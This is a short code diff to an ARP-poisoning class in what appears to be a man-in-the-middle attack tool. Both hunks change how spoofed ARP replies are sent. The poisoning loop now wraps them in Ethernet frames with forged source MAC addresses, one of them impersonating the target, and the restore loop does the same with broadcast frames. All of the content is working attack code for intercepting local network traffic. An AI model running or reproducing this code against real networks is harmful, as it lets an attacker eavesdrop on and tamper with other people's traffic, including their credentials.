@@ -214,8 +214,8 @@ class ARPpoisoner:
                         if targetmac is not None: 
                             try:
                                 #log.debug("Poisoning {} <-> {}".format(targetip, self.gatewayip))
-                                self.s.send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
-                                self.s.send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
+                                self.s2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
+                                self.s2.send(Ether(src=targetmac, dst=self.gatewaymac)/ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                             except Exception as e:
                                 if "Interrupted system call" not in e:
                                    log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
@@ -242,8 +242,8 @@ class ARPpoisoner:
                     log.info("Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
                     try:
                         for i in range(0, count):
-                            self.s.send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac))
-                            self.s.send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac))
+                            self.s2.send(Ether(src=targetmac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac))
+                            self.s2.send(Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac))
                     except Exception as e:
                         if "Interrupted system call" not in e:
                            log.error("Exception occurred while poisoning {}: {}".format(targetip, e))
